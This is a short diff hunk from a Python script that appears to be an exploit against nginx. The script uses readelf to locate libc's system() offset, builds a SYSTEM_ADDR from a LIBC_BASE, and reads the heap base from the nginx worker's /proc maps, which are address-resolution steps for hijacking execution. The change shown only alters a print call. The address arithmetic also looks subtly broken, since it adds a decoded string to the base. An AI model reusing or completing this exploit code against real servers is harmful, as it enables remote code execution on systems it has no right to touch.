@@ -36,7 +36,7 @@ system_offset = subprocess.check_output(
     "readelf -sW /usr/lib/x86_64-linux-gnu/libc.so.6 | grep -E ' system(@|$)'",
     shell=True)
 system_offset = re.search(rb':\s+0*([0-9a-f]+)\s', system_offset).group(1)
-print("System Offset:", system_offset)
+print("System Offset:", system_offset.decode())
 SYSTEM_ADDR = LIBC_BASE + system_offset.decode()
 # Determine the HEAP_BASE
 HEAP_BASE = subprocess.check_output(f"grep '\[heap\]' /proc/{nginx_worker_process}/maps", shell=True)
